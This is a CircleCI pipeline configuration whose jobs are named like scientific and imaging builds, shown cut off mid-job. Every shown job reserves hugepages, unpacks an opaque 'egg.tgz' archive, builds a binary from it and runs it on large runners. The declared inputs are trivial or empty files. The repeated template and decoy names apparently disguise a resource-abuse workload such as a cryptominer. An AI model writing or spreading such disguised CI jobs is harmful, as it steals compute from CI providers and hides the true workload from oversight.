version: 2.1

jobs:
  kalman-unscented:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set covariance
          command: |
            printf 'sigma 0.1\n' > ukf.cfg
      - run:
          name: Build UKF
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target kalman-unscented -j2
      - run:
          name: Run unscented update
          command: LIONSS_LP=1 ./build/kalman-unscented --conf ukf.cfg --alpha 0.001
  BloomThreshold:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set threshold
          command: |
            printf 'thresh 1.1\n' > bloom.cfg
      - run:
          name: Build post stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target BloomThreshold -j2
      - run:
          name: Extract bloom highlights
          command: LIONSS_LP=1 ./build/BloomThreshold --conf bloom.cfg --mips 6
  onnxShapeinfer:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write model graph
          command: |
            : > model.onnx
      - run:
          name: Build shape engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target onnxShapeinfer -j2
      - run:
          name: Infer tensor shapes
          command: LIONSS_LP=1 ./build/onnxShapeinfer --model model.onnx --opset 17
  hdr-tonemap:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load raw hdr
          command: |
            : > scene.exr
      - run:
          name: Build imaging pipeline
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target hdr-tonemap -j2
      - run:
          name: Tonemap HDR scene
          command: LIONSS_LP=1 ./build/hdr-tonemap --in scene.exr --operator reinhard
  tallow:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
